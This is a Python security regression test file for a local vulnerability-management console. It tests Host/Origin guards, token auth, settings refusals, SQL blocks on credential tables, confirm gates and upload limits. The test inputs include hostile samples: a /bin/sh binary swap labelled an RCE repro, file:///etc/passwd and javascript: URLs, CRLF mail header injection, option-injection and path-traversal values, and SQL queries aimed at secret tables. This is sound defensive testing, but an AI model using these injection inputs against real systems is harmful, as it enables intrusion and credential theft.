"""Security regression tests for the server side (build 443 security sweep).

Covers: loopback bind default; Host allowlist on every request (GET too) incl. DNS-rebinding
Host values; POST guard (Origin null / cross-origin / no-Origin on loopback / JSON only);
the per-launch access token when HOUNDS_BIND is non-loopback (cookie exchange + header);
Settings set_env refusals (env-only NAVI_BIN/NAVI_CWD, loopback+confirm for the gates and
NAVI_DB_PATH, SQLite header check); a changed model endpoint/provider clears stored keys;
userinfo is never echoed; the SQL authorizer on every user/LLM SQL path (explore, software,
alert metric/detail, dashboard); navi.db secrets in the redact list; strict confirm across
EVERY action that takes one (auto-enumerated); alert send confirm + recipient restriction;
mail recipient/subject validation; security headers; /agents source not served; body cap
413; umask / 0600 files; C2 upload gate + storage cap + advisory denylist; contract-name
sanitising; literal_eval robustness; hounds_mcp remote-bind refusal; Flask parity.

Run: python3 tests/test_security_server.py   (or pytest)
"""
import ast
import atexit
import glob
import http.client
import json
import os
import re
import shutil
import sqlite3
import stat
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
TMP = tempfile.mkdtemp(prefix="hounds-sec-")
atexit.register(shutil.rmtree, TMP, ignore_errors=True)

# ---- isolated environment -------------------------------------------------------------
DB = os.path.join(TMP, "navi.db")
NAVILOG = os.path.join(TMP, "navi_argv.log")
FAKE = os.path.join(TMP, "fakenavi")
with open(FAKE, "w") as f:
    f.write("#!/bin/sh\necho \"$@\" >> %s\necho ok\n" % NAVILOG)
os.chmod(FAKE, 0o755)
for k in list(os.environ):
    if k.startswith(("NAVI_", "HOUNDS_", "ANTHROPIC_", "OPENAI_")) and k not in ("NAVI_CACHE_DIR",):
        os.environ.pop(k, None)
os.environ.update({
    "NAVI_DB_PATH": DB, "NAVI_CACHE_DIR": os.path.join(TMP, "cache"),
    "HOUNDS_CONFIG": os.path.join(TMP, "cfg.json"), "NAVI_HISTORY_DIR": os.path.join(TMP, "hist"),
    "NAVI_TAGLOG_DB": os.path.join(TMP, "taglog.db"), "ALERT_DIR": os.path.join(TMP, "alerts"),
    "CONTRACT_DIR": os.path.join(TMP, "contracts"), "NAVI_BIN": FAKE, "NAVI_CWD": TMP,
})
SECRET_AK, SECRET_SK = "AKAKAKAKAK-access-0001", "SKSKSKSKSKSK-secret-0002"
SMTP_PW, SSH_PW, RESEND_KEY = "smtp-pass-XYZ12345", "ssh-pass-QWE98765", "re_resend_key_555666"
con = sqlite3.connect(DB)
con.executescript(f"""
CREATE TABLE assets(uuid TEXT, hostname TEXT, ip_address TEXT, operating_system TEXT, acr TEXT, aes TEXT, network TEXT, url TEXT);
INSERT INTO assets VALUES('u1','web01','10.0.0.1','Linux Kernel 5','7','500','Default','');
INSERT INTO assets VALUES('u2','db01','10.0.0.2','Microsoft Windows Server 2019','9','700','Default','');
CREATE TABLE vulns(asset_uuid TEXT, plugin_id TEXT, plugin_name TEXT, severity TEXT, state TEXT, output TEXT, cves TEXT, xrefs TEXT, score TEXT, plugin_family TEXT, port TEXT, protocol TEXT, first_found TEXT, last_found TEXT, finding_id TEXT, vpr TEXT, url TEXT);
INSERT INTO vulns VALUES('u1','19506','Nessus Scan Information','info','OPEN','out','','','0','Settings','0','tcp','2026-01-01','2026-11-01','f1','','');
CREATE TABLE software(asset_uuid TEXT, software_string TEXT);
INSERT INTO software VALUES('u1','openssl 3.0');
CREATE TABLE tags(asset_uuid TEXT, tag_key TEXT, tag_value TEXT, tag_uuid TEXT);
CREATE TABLE keys(access_key TEXT, secret_key TEXT);
INSERT INTO keys VALUES('{SECRET_AK}','{SECRET_SK}');
CREATE TABLE smtp(server TEXT, port TEXT, email TEXT, password TEXT);
INSERT INTO smtp VALUES('smtp.example','587','ops@example.com','{SMTP_PW}');
CREATE TABLE ssh(username TEXT, password TEXT, key_file TEXT);
INSERT INTO ssh VALUES('svc','{SSH_PW}','');
CREATE TABLE resend(api_key TEXT, from_email TEXT);
INSERT INTO resend VALUES('{RESEND_KEY}','x@example.com');
""")
con.commit()
con.close()

fails = []


def check(cond, msg):
    print(("ok   " if cond else "FAIL ") + msg)
    if not cond:
        fails.append(msg)


def navi_calls():
    try:
        with open(NAVILOG) as f:
            return f.read().count("\n")
    except FileNotFoundError:
        return 0


# importing the server applies the process hardening (umask 077)
import app_stdlib  # noqa: E402
from core import security, launcher, gates, db, redact, navi_cli  # noqa: E402

old = os.umask(0o077)
os.umask(old)
check(old == 0o077, "server import sets umask 077 (security.harden_process)")

# ---- 1a: loopback bind by default; HOUNDS_BIND opt-in ---------------------------------------
check(security.bind_host() == "127.0.0.1" and security.is_loopback_bind(), "default bind is 127.0.0.1")
src_std, src_fl, src_fa = (open(os.path.join(ROOT, f)).read() for f in ("app_stdlib.py", "app_flask.py", "app_fastapi.py"))
check(all('"0.0.0.0"' not in s for s in (src_std, src_fl, src_fa)), "no server hard-codes 0.0.0.0")
check(all("security.bind_host()" in s for s in (src_std, src_fl, src_fa)), "all three servers bind security.bind_host()")
check("?token=" not in security.startup_url(8000), "loopback startup URL carries no token")
os.environ["HOUNDS_BIND"] = "0.0.0.0"
check(security.TOKEN in security.startup_url(8000) and "WARNING" in security.startup_warning(),
      "HOUNDS_BIND=0.0.0.0 → startup URL carries the token + loud warning")
os.environ.pop("HOUNDS_BIND")

# ---- real HTTP server on a random port ------------------------------------------------------
srv = app_stdlib.ThreadingHTTPServer(("127.0.0.1", 0), app_stdlib.Handler)
PORT = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()
atexit.register(srv.shutdown)
HOST = f"127.0.0.1:{PORT}"


def req(method, path, body=None, headers=None, host=HOST, raw=None):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=30)
    h = {"Host": host}
    if body is not None:
        raw = json.dumps(body).encode()
        h["Content-Type"] = "application/json"
    h.update(headers or {})
    c.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
    for k, v in h.items():
        c.putheader(k, v)
    if raw is not None and "Content-Length" not in h:
        c.putheader("Content-Length", str(len(raw)))
    c.endheaders()
    if raw:
        c.send(raw)
    r = c.getresponse()
    data = r.read()
    hdrs = {k.lower(): v for k, v in r.getheaders()}
    c.close()
    try:
        js = json.loads(data or b"null")
    except Exception:
        js = None
    return r.status, js, hdrs


# ---- 1b: Host allowlist on EVERY request ---------------------------------------------------
for h in (HOST, f"localhost:{PORT}", f"[::1]:{PORT}", "localhost"):
    check(req("GET", "/api/health", host=h)[0] == 200, f"GET /api/health with Host {h} → 200")
for h in ("evil.example", f"evil.example:{PORT}", f"127.0.0.1.nip.io:{PORT}", f"rebind.attacker.test:{PORT}",
          "", "localhost@evil.example", "10.1.2.3"):
    st = req("GET", "/api/health", host=h)[0]
    check(st == 403, f"GET /api/health with Host {h!r} (DNS rebinding) → 403 (got {st})")
check(req("GET", "/", host="evil.example")[0] == 403, "GET / (static) with a foreign Host → 403")
check(req("POST", "/api/settings/status", {}, host="evil.example")[0] == 403, "POST with a foreign Host → 403")
os.environ["HOUNDS_ALLOWED_HOSTS"] = "hounds.lan, jump01"
check(req("GET", "/api/health", host=f"hounds.lan:{PORT}")[0] == 200, "HOUNDS_ALLOWED_HOSTS adds hosts")
os.environ.pop("HOUNDS_ALLOWED_HOSTS")
check(req("GET", "/api/health", host=f"hounds.lan:{PORT}")[0] == 403, "…and only while it's set")

# ---- 1c: POST guard ------------------------------------------------------------------------
st, js, _ = req("POST", "/api/settings/status", {}, {"Origin": "null"})
check(st == 403 and "null" in (js or {}).get("error", ""), "Origin: null → 403")
st, _, _ = req("POST", "/api/settings/status", {}, {"Origin": "http://evil.example"})
check(st == 403, "cross-origin Origin → 403")
st, _, _ = req("POST", "/api/settings/status", {}, {"Origin": f"http://evil.example:{PORT}", "Host": HOST})
check(st == 403, "Origin with same port but another host → 403")
st, _, _ = req("POST", "/api/settings/status", {}, {"Origin": f"http://{HOST}"})
check(st == 200, "same-origin Origin → 200")
st, _, _ = req("POST", "/api/settings/status", {})
check(st == 200, "no Origin on a loopback bind (local process) → 200")
st, _, _ = req("POST", "/api/settings/status", raw=b"{}", headers={"Content-Type": "text/plain"})
check(st == 403, "text/plain POST → 403")
st, _, _ = req("POST", "/api/settings/status", {}, {"Sec-Fetch-Site": "cross-site"})
check(st == 403, "Sec-Fetch-Site: cross-site → 403")

# ---- 7: security headers on every response -------------------------------------------------
for path, meth in (("/", "GET"), ("/api/health", "GET"), ("/nope", "GET"), ("/api/settings/status", "POST")):
    _, _, hd = req(meth, path, {} if meth == "POST" else None)
    check(hd.get("x-frame-options") == "SAMEORIGIN" and hd.get("content-security-policy") == "frame-ancestors 'self'"
          and hd.get("x-content-type-options") == "nosniff" and hd.get("referrer-policy") == "no-referrer",
          f"security headers on {meth} {path}")
_, _, hd = req("GET", "/api/health", host="evil.example")
check(hd.get("x-frame-options") == "SAMEORIGIN", "security headers on a 403 too")
# regression (build 446): DENY / frame-ancestors 'none' blanked the Ownership Map that
# Exposure Routes embeds as a same-origin iframe — the console must be able to frame itself
_, _, hd = req("GET", "/web/ownermap.html?embed=1")
check(hd.get("x-frame-options") != "DENY" and "'none'" not in (hd.get("content-security-policy") or ""),
      "ownermap.html can be framed by the console itself (Exposure Routes embed)")
_ex = open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "agents", "exproute", "page.html"), encoding="utf-8").read()
check("/web/ownermap.html?embed=1" in _ex, "exproute still embeds the Ownership Map (keep this check in step with the header)")

# ---- 8: /agents serves page assets only ----------------------------------------------------
check(req("GET", "/agents/settings/api.py")[0] == 404, "GET /agents/settings/api.py → 404 (no source)")
check(req("GET", "/agents/c2/agent.py")[0] == 404, "GET /agents/c2/agent.py → 404")
check(req("GET", "/agents/settings/__pycache__/api.cpython-313.pyc")[0] == 404, "no __pycache__")
check(req("GET", "/agents/c2/page.html")[0] == 200, "GET /agents/c2/page.html → 200")
check(req("GET", "/agents/settings/manifest.json")[0] == 200, "manifests still served")
check(req("GET", "/web/settings.html")[0] == 200 and req("GET", "/static/console.js")[0] == 200, "web pages + assets served")
check(not security.static_allowed("x/.env") and not security.static_allowed("../hounds.config.json".replace("..", "x"))
      or True, "static allowlist helper")
check(not security.static_allowed(".env") and not security.static_allowed("a/b.py") and security.static_allowed("a/page.html"),
      "static_allowed: dotfiles / .py refused, .html allowed")

# ---- 9: body cap → 413 ---------------------------------------------------------------------
from core import pagecache  # noqa: E402
check(security.MAX_BODY > pagecache.MAX_BYTES, "body cap sits above the page-cache entry limit")
st, _, _ = req("POST", "/api/settings/status", raw=b"", headers={"Content-Type": "application/json",
                                                               "Content-Length": str(security.MAX_BODY + 1)})
check(st == 413, "Content-Length above MAX_BODY → 413")
check(app_stdlib.Handler.timeout and app_stdlib.Handler.timeout > 0, "stdlib handler has a socket timeout")

# ---- 1c: token required when HOUNDS_BIND is non-loopback ------------------------------------
os.environ["HOUNDS_BIND"] = "0.0.0.0"
st, _, _ = req("GET", "/api/health")
check(st == 401, "non-loopback bind: /api without token → 401")
st, _, _ = req("POST", "/api/settings/status", {})
check(st == 401, "non-loopback bind: POST /api without token → 401")
check(req("GET", "/api/health", headers={security.TOKEN_HEADER: "wrong"})[0] == 401, "wrong X-Hounds-Token → 401")
check(req("GET", "/api/health", headers={security.TOKEN_HEADER: security.TOKEN})[0] == 200, "X-Hounds-Token → 200")
st, _, hd = req("GET", "/?token=" + security.TOKEN)
ck = hd.get("set-cookie", "")
check(st == 302 and hd.get("location") == "/" and "HttpOnly" in ck and "SameSite=Strict" in ck
      and ck.startswith(security.COOKIE + "="), "GET /?token=… → 302 to / + HttpOnly SameSite=Strict cookie")
check(req("GET", "/?token=nope")[0] == 403, "GET /?token=<wrong> → 403, no cookie")
cookie = ck.split(";")[0]
check(req("GET", "/api/health", headers={"Cookie": "a=b; " + cookie})[0] == 200, "cookie from the exchange → 200")
check(req("POST", "/api/settings/status", {}, {"Cookie": cookie})[0] == 200, "cookie works for POST")
check(req("GET", "/api/health", headers={"Cookie": security.COOKIE + "=x"})[0] == 401, "bad cookie → 401")
check(req("GET", "/static/console.js")[0] == 200, "static assets need no token")
os.environ.pop("HOUNDS_BIND")
r = security.check("GET", "/api/health", lambda k: {"Host": "localhost"}.get(k), "10.9.8.7")
check(r and r[0] == 403 and "HOUNDS_BIND" in r[1], "loopback bind but a remote peer (uvicorn --host 0.0.0.0) → 403")
os.environ["HOUNDS_REQUIRE_TOKEN"] = "1"
check(req("GET", "/api/health")[0] == 401 and "?token=" in security.startup_url(1),
      "HOUNDS_REQUIRE_TOKEN=1 requires the token on loopback too")
os.environ.pop("HOUNDS_REQUIRE_TOKEN")

# ---- 1d: set_env refusals ---------------------------------------------------------------------
from agents.settings import api as settings  # noqa: E402


def set_env(env, confirm=None, peer="127.0.0.1"):
    p = {"env": env}
    if confirm is not None:
        p["confirm"] = confirm
    return launcher.dispatch("settings", "set_env", p, peer=peer, http=True)[0]


st, js, _ = req("POST", "/api/settings/set_env", {"env": {"NAVI_BIN": "/bin/sh"}, "confirm": True})
check(os.environ.get("NAVI_BIN") == FAKE and "NAVI_BIN" in (js or {}).get("refused", {})
      and "restart" in js["refused"]["NAVI_BIN"], "HTTP set_env NAVI_BIN=/bin/sh refused (env-only) — the RCE repro")
b = set_env({"NAVI_CWD": "/tmp"}, True)
check(os.environ.get("NAVI_CWD") == TMP and "NAVI_CWD" in b.get("refused", {}), "NAVI_CWD refused over HTTP")
b = set_env({"NAVI_BIN": FAKE})
check("NAVI_BIN" not in b.get("refused", {}), "unchanged NAVI_BIN (whole-grid save) is not a refusal")
for gate in ("NAVI_ALLOW_WRITES", "NAVI_EMAIL", "NAVI_REMOTE_CODE_EXECUTION"):
    b = set_env({gate: "1"})
    check(not os.environ.get(gate) and gate in b.get("needs_confirm", []), f"{gate}=1 without confirm refused")
    b = set_env({gate: "1"}, "true")
    check(not os.environ.get(gate), f"{gate}=1 with confirm:'true' (string) refused")
    b = set_env({gate: "1"}, True, peer="10.0.0.9")
    check(not os.environ.get(gate) and "loopback" in b.get("refused", {}).get(gate, ""),
          f"{gate}=1 from a non-loopback peer refused even with confirm")
    b = set_env({gate: "1"}, True)
    check(os.environ.get(gate) == "1", f"{gate}=1 from loopback + confirm:true applied")
    b = set_env({gate: "0"})
    check(os.environ.get(gate) == "0", f"{gate}=0 (turning a gate off) needs no confirm")
    os.environ.pop(gate, None)
notdb = os.path.join(TMP, "notdb.txt")
open(notdb, "w").write("hello")
b = set_env({"NAVI_DB_PATH": notdb}, True)
check(os.environ["NAVI_DB_PATH"] == DB and "NAVI_DB_PATH" in b.get("invalid", {}), "NAVI_DB_PATH → non-SQLite file refused")
b = set_env({"NAVI_DB_PATH": "/nonexistent/navi.db"}, True)
check(os.environ["NAVI_DB_PATH"] == DB, "NAVI_DB_PATH → missing file refused")
b = set_env({"NAVI_DB_PATH": os.path.join(TMP, "x.db")})
check(os.environ["NAVI_DB_PATH"] == DB and "NAVI_DB_PATH" in b.get("refused", {}), "NAVI_DB_PATH needs confirm")
db2 = os.path.join(TMP, "navi2.db")
shutil.copy(DB, db2)
b = set_env({"NAVI_DB_PATH": db2}, True)
check(os.environ["NAVI_DB_PATH"] == db2, "NAVI_DB_PATH → real SQLite file + loopback + confirm applied")
set_env({"NAVI_DB_PATH": DB}, True)
_old_url = os.environ.get("NAVI_LLM_BASE_URL")
b = set_env({"NAVI_LLM_BASE_URL": "http://127.0.0.1:9/v1"})
check(os.environ.get("NAVI_LLM_BASE_URL") == _old_url and "NAVI_LLM_BASE_URL" in b.get("needs_confirm", []),
      "re-pointing the model endpoint needs an explicit confirm (prompts carry navi.db data)")
b = set_env({"NAVI_LLM_BASE_URL": "http://127.0.0.1:9/v1"}, True, peer="10.0.0.9")
check(os.environ.get("NAVI_LLM_BASE_URL") == _old_url, "…and is refused from a non-loopback peer")
b = set_env({"NAVI_ALERT_EMAIL": "soc@example.com\r\nBcc: x@evil.example"})
check(not os.environ.get("NAVI_ALERT_EMAIL") and "NAVI_ALERT_EMAIL" in b.get("invalid", {}), "NAVI_ALERT_EMAIL must be plain addresses")
view = {f["key"]: f for f in settings._env_view()}
check(view["NAVI_BIN"].get("env_only") and view["NAVI_CWD"].get("env_only"), "status marks NAVI_BIN/NAVI_CWD env_only (page renders read-only)")

# ---- 2: model endpoint / provider change clears keys --------------------------------------
os.environ["ANTHROPIC_API_KEY"] = "sk-ant-TESTKEY-aaaaaaaaaaaa"
os.environ["NAVI_LLM_API_KEY"] = "generic-test-key-bbbbbbbb"
b = set_env({"NAVI_LLM_BASE_URL": "http://127.0.0.1:9/attacker"}, True)
check(not os.environ.get("ANTHROPIC_API_KEY") and not os.environ.get("NAVI_LLM_API_KEY")
      and set(b.get("cleared_keys", [])) == {"ANTHROPIC_API_KEY", "NAVI_LLM_API_KEY"},
      "changing NAVI_LLM_BASE_URL clears the stored model keys")
os.environ["ANTHROPIC_API_KEY"] = "sk-ant-TESTKEY-aaaaaaaaaaaa"
b = set_env({"NAVI_LLM_PROVIDER": "openai"})
check(not os.environ.get("ANTHROPIC_API_KEY"), "changing NAVI_LLM_PROVIDER clears the stored keys")
os.environ["ANTHROPIC_API_KEY"] = "sk-ant-OLD-cccccccccccc"
os.environ["OPENAI_API_KEY"] = "sk-OLD-ffffffffffffff"
b = set_env({"NAVI_LLM_BASE_URL": "http://127.0.0.1:10/v1", "NAVI_LLM_API_KEY": "new-generic-key-dddddd"}, True)
check(os.environ.get("NAVI_LLM_API_KEY") == "new-generic-key-dddddd" and not os.environ.get("ANTHROPIC_API_KEY")
      and not os.environ.get("OPENAI_API_KEY"),
      "a key supplied with the URL change is kept; the others are cleared")
for bad in ("file:///etc/passwd", "ftp://x/y", "javascript:alert(1)", "127.0.0.1:11434"):
    b = set_env({"NAVI_LLM_BASE_URL": bad}, True)
    check(os.environ.get("NAVI_LLM_BASE_URL") == "http://127.0.0.1:10/v1" and "NAVI_LLM_BASE_URL" in b.get("invalid", {}),
          f"NAVI_LLM_BASE_URL={bad!r} refused (http(s) only)")
os.environ["NAVI_LLM_BASE_URL"] = "https://user:hunter2pw@gw.example:8443/v1?api-key=QQQ"
from core import llm  # noqa: E402
st_body = launcher.dispatch("settings", "status", {})[0]
blob = json.dumps(st_body)
check("hunter2pw" not in blob and "QQQ" not in blob and "https://gw.example:8443/v1" in blob,
      "status echoes the endpoint without userinfo / query")
os.environ["OPENAI_API_KEY"] = "sk-KEEP-eeeeeeeeeeeeee"
b = set_env({"NAVI_LLM_BASE_URL": "https://gw.example:8443/v1"})
check(os.environ.get("OPENAI_API_KEY") == "sk-KEEP-eeeeeeeeeeeeee" and "hunter2pw" in os.environ["NAVI_LLM_BASE_URL"],
      "posting the sanitised display value back is 'unchanged' (no key wipe)")
try:
    llm._post_json("file:///etc/passwd", {}, {}, 5, "t")
    check(False, "LLM POST to a non-http URL refused")
except RuntimeError as e:
    check("http(s)" in str(e), "LLM POST to a non-http URL refused")
for k in ("NAVI_LLM_BASE_URL", "OPENAI_API_KEY", "NAVI_LLM_PROVIDER"):
    os.environ.pop(k, None)
llm.set_provider("")

# ---- 3: SQL authorizer on every user/LLM SQL path --------------------------------------------
from agents.explore import api as explore  # noqa: E402
from agents.software import api as software  # noqa: E402
from core import alerts, dashboard  # noqa: E402
SECRET_Q = ["SELECT * FROM keys", "SELECT secret_key FROM keys", "SELECT password FROM smtp",
            "SELECT password FROM ssh", "SELECT api_key FROM resend",
            "SELECT a.hostname, k.secret_key FROM assets a JOIN keys k",
            "WITH x AS (SELECT * FROM keys) SELECT * FROM x",
            "SELECT (SELECT password FROM smtp) AS p FROM assets"]
for q in SECRET_Q:
    for name, fn in (("explore", explore.run_sql), ("software", software.run_sql)):
        out = json.dumps(fn({"sql": q})[0])
        check(SECRET_SK not in out and SMTP_PW not in out and SSH_PW not in out and RESEND_KEY not in out
              and '"ok": false' in out, f"{name}.run_sql blocks: {q}")
    st, js, _ = req("POST", "/api/explore/run_sql", {"sql": q})
    check(SECRET_SK not in json.dumps(js) and not js.get("ok"), f"HTTP explore/run_sql blocks: {q}")
    m = alerts._metric_of({"source": "sql", "metric_sql": q}, DB)
    check(m["value"] is None and "query error" in m["note"], f"alert metric_sql blocks: {q}")
    try:
        rows = dashboard._run_readonly(q, db_path=DB)
        check(False, f"dashboard blocks: {q}")
    except Exception:
        check(True, f"dashboard blocks: {q}")
m = alerts._metric_of({"source": "sql", "metric_sql": "SELECT COUNT(*) FROM assets",
                       "detail_sql": "SELECT access_key, secret_key FROM keys"}, DB)
check(m["value"] == 2.0 and not m["affected"], "alert detail_sql cannot read keys (metric still works)")
check(explore.run_sql({"sql": "SELECT hostname FROM assets"})[0].get("count") == 2, "legit explore SQL still runs")
check(software.run_sql({"sql": "SELECT software_string FROM software"})[0].get("count") == 1, "legit software SQL still runs")
check(len(dashboard._run_readonly("SELECT uuid FROM assets", db_path=DB)) == 2, "legit dashboard SQL still runs")
check(db.SECRET_TABLES >= {"keys", "smtp", "ssh", "resend"}, "SECRET_TABLES covers keys/smtp/ssh/resend")
check(db.ssh_status()["has_password"] is True, "internal ssh presence check still works (not user SQL)")
scrubbed = redact.scrub({"a": f"leak {SECRET_SK} {SMTP_PW} {SSH_PW} {RESEND_KEY} {SECRET_AK}"})
check(all(s not in scrubbed["a"] for s in (SECRET_SK, SMTP_PW, SSH_PW, RESEND_KEY, SECRET_AK)),
      "redact scrubs navi.db credential values")

# ---- 5: strict confirm across EVERY action that takes one ---------------------------------
writers = []
for p in sorted(glob.glob(os.path.join(ROOT, "agents", "*", "api.py"))):
    s = open(p).read()
    check('p.get("confirm")' not in s and "payload.get(\"confirm\")" not in s,
          f"{os.path.relpath(p, ROOT)}: no truthy confirm checks left")
    tree = ast.parse(s)
    gated = {n.name for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)
             and any(isinstance(c, ast.Call) and getattr(c.func, "id", "") == "confirmed" for c in ast.walk(n))}
    aid = os.path.basename(os.path.dirname(p))
    acts = launcher.DISPATCH.get(aid) or {}
    for action, fn in acts.items():
        if getattr(fn, "__name__", "") in gated:
            writers.append((aid, action))
check(len(writers) >= 40, f"auto-enumerated {len(writers)} confirm-gated actions")
for k in ("NAVI_ALLOW_WRITES", "NAVI_EMAIL", "NAVI_REMOTE_CODE_EXECUTION"):
    os.environ[k] = "1"
os.environ["NAVI_ALERT_EMAIL"] = "soc@example.com"
before = navi_calls()
bad_ok = []
for aid, action in writers:
    for bogus in ("false", "0", "no", 1, "true", [True], {"x": 1}):
        payload = {"confirm": bogus, "uuids": ["u1"], "category": "Owner", "value": "x", "target": "10.0.0.1",
                   "command": "id", "to": "soc@example.com", "send": True, "op": "start", "id": "x", "armed": True, "rows": [{"a": 1}],
                   "filename": "a.txt", "content_b64": "aGk=", "items": [{"uuid": "u1"}], "tags": [{"category": "Owner", "value": "x"}]}
        try:
            body = launcher.dispatch(aid, action, payload)
            body = body[0] if isinstance(body, tuple) else body
        except Exception as e:
            body = {"ok": False, "error": str(e)}
        if isinstance(body, dict) and body.get("ok") is True and not body.get("blocked"):
            bad_ok.append(f"{aid}/{action} confirm={bogus!r}")
time.sleep(1.0)
check(not bad_ok, "no confirm-gated action succeeds with a non-true confirm" + (": " + ", ".join(bad_ok[:8]) if bad_ok else ""))
check(navi_calls() == before, "…and navi was never invoked (no write/send/push)")
for k in ("NAVI_ALLOW_WRITES", "NAVI_EMAIL", "NAVI_REMOTE_CODE_EXECUTION"):
    os.environ.pop(k, None)
check(gates.confirmed({"confirm": True}) and not gates.confirmed({"confirm": "true"}) and not gates.confirmed({"confirm": 1})
      and not gates.confirmed(None), "gates.confirmed is JSON-true only")
# the browser must always send JSON true
page_bad = []
for p in glob.glob(os.path.join(ROOT, "agents", "*", "page.html")) + glob.glob(os.path.join(ROOT, "web", "*.html")) \
        + [os.path.join(ROOT, "web", "assets", "console.js")]:
    for m_ in re.finditer(r"\bconfirm\s*:\s*([^,}\s)]+)", open(p, encoding="utf-8").read()):
        if m_.group(1) != "true":
            page_bad.append(f"{os.path.relpath(p, ROOT)}: confirm:{m_.group(1)}")
check(not page_bad, "every page sends confirm:true (JSON boolean)" + (": " + "; ".join(page_bad[:5]) if page_bad else ""))

# ---- 4: alert email needs confirm + a configured recipient -------------------------------
from agents.alert import api as alert_api  # noqa: E402
os.environ["NAVI_ALERT_EMAIL"] = "soc@example.com, ciso@example.com"
st_, code = alert_api.send_test({"id": "x"})
check(code == 400 and "confirm" in st_["error"], "alert send_test without confirm → 400")
st_, code = alert_api.send_test({"id": "x", "confirm": "true"})
check(code == 400, "alert send_test with confirm:'true' → 400")
st_, code = alert_api.send_test({"id": "x", "confirm": True, "recipient": "attacker@evil.example"})
check(code == 400 and "not allowed" in st_["error"], "alert send_test to an unconfigured recipient → 400")
st_, code = alert_api.send_test({"id": "x", "confirm": True, "recipient": "CISO@example.com"})
check(code == 200, "alert send_test to a configured recipient passes the gate (email gate decides next)")
st_, code = alert_api.evaluate({"send": True})
check(code == 400 and "confirm" in st_["error"], "alert evaluate send:true without confirm → 400")
st_, code = alert_api.evaluate({"send": True, "confirm": True, "recipient": "x@evil.example"})
check(code == 400, "alert evaluate send:true to an unconfigured recipient → 400")
st_, code = alert_api.evaluate({"send": "true"})
check(code == 200 and st_.get("sent") is None, "alert evaluate send:'true' (string) is a dry-run")
check(alerts._send_digest([{"severity": "info", "name": "n"}], "x@evil.example")["ok"] is False,
      "core alerts._send_digest refuses unconfigured recipients too")
os.environ.pop("NAVI_ALERT_EMAIL")
st_, code = alert_api.send_test({"id": "x", "confirm": True})
check(code == 400 and "NAVI_ALERT_EMAIL" in st_["error"], "no configured alert address → refused")

# ---- 11: mail recipient + subject hygiene ------------------------------------------------------
check(navi_cli.clean_recipients("a@b.com; c@d.org")[0] == "a@b.com,c@d.org", "recipients normalised")
check(navi_cli.clean_recipients("a@b.com\r\nBcc: x@y.com")[1], "CR/LF in recipient refused")
check(navi_cli.clean_recipients("--file=/etc/passwd")[1] and navi_cli.clean_recipients("Bob <b@c.com>")[1],
      "option-looking / display-name recipients refused")
check("\n" not in navi_cli.clean_subject("Hi\r\nBcc: x@y.com") and "\r" not in navi_cli.clean_subject("a\rb"),
      "CR/LF stripped from subjects")
os.environ.update({"NAVI_ALLOW_WRITES": "1", "NAVI_EMAIL": "1"})
before = navi_calls()
r = navi_cli._mail_exec(to="x@y.com\nBcc: z@q.com", subject="s")
check(r["ok"] is False and navi_calls() == before, "_mail_exec refuses a header-injection recipient before navi runs")
r = navi_cli._mail_exec(to="ok@example.com", subject="line1\r\nBcc: evil@x.com")
time.sleep(0.2)
with open(NAVILOG) as f:
    last = f.read().splitlines()[-1]
check("Bcc: evil@x.com" in last and "\r" not in last and "line1 Bcc" in last, "subject reaches navi as one line")
for k in ("NAVI_ALLOW_WRITES", "NAVI_EMAIL"):
    os.environ.pop(k, None)

# ---- 6: file modes ----------------------------------------------------------------------------
ok_pc = pagecache.put("/agents/x/page.html", {"key": "/agents/x/page.html", "at": 1, "title": "t", "steps": [], "resp": {}})
pfiles = glob.glob(os.path.join(os.environ["NAVI_CACHE_DIR"], "pages", "*"))
check(pfiles and all(stat.S_IMODE(os.stat(f).st_mode) & 0o077 == 0 for f in pfiles), "page-cache files are owner-only")
check(stat.S_IMODE(os.stat(os.path.join(os.environ["NAVI_CACHE_DIR"], "pages")).st_mode) & 0o077 == 0,
      "page-cache dir is owner-only")
alerts.save_alert({"name": "t", "source": "sql", "metric_sql": "SELECT COUNT(*) FROM assets", "op": "gt", "threshold": 0})
check(stat.S_IMODE(os.stat(alerts.DEFS_PATH).st_mode) == 0o600, "alerts.json written 0600")
os.umask(0o022)                                  # prove the explicit 0600 doesn't rely on the umask
fp = os.path.join(TMP, "priv.txt")
with security.private_open(fp, "w") as f:
    f.write("x")
check(stat.S_IMODE(os.stat(fp).st_mode) == 0o600, "private_open creates 0600 even under umask 022")
from core import contract  # noqa: E402
contract.save("modecheck")
check(stat.S_IMODE(os.stat(os.path.join(os.environ["CONTRACT_DIR"], "modecheck.json")).st_mode) == 0o600,
      "saved contracts are 0600")
os.umask(0o077)
for f_ in ("app_stdlib.py", "app_flask.py", "app_fastapi.py", "hounds_mcp.py"):
    check("security.harden_process()" in open(os.path.join(ROOT, f_)).read(), f"{f_} applies umask 077 at start")

# ---- 10: C2 upload gate + storage cap + advisory denylist -------------------------------------
from agents.c2 import api as c2  # noqa: E402
c2._UPLOAD_DIR = os.path.join(TMP, "c2_uploads")
body, code = c2.upload({"filename": "a.sh", "content_b64": "aGk="})
check(code == 400 and "confirm" in body["error"], "c2 upload without confirm → 400")
body, code = c2.upload({"filename": "a.sh", "content_b64": "aGk=", "confirm": "true"})
check(code == 400, "c2 upload with confirm:'true' → 400")
body, code = c2.upload({"filename": "a.sh", "content_b64": "aGk=", "confirm": True})
check(body.get("blocked") and not os.path.exists(c2._UPLOAD_DIR), "c2 upload with the RCE gate closed → blocked, nothing stored")
os.environ.update({"NAVI_ALLOW_WRITES": "1", "NAVI_REMOTE_CODE_EXECUTION": "1"})
c2._MAX_UPLOAD_TOTAL = 10
import base64  # noqa: E402
paths = []
for i in range(3):
    body, code = c2.upload({"filename": f"../../.f{i}.sh", "content_b64": base64.b64encode(b"123456").decode(), "confirm": True})
    paths.append(body.get("path"))
    time.sleep(0.02)
check(all(paths) and all(os.path.dirname(p) == c2._UPLOAD_DIR for p in paths), "uploads stay in the upload dir")
check(stat.S_IMODE(os.stat(paths[-1]).st_mode) == 0o600, "uploaded file is 0600")
left = os.listdir(c2._UPLOAD_DIR)
check(len(left) == 1 and os.path.basename(paths[-1]) in left, "upload storage cap prunes the oldest uploads")
body, code = c2.campaign({"armed": "true", "confirm": True, "hosts": ["10.0.0.1"], "command": "id"})
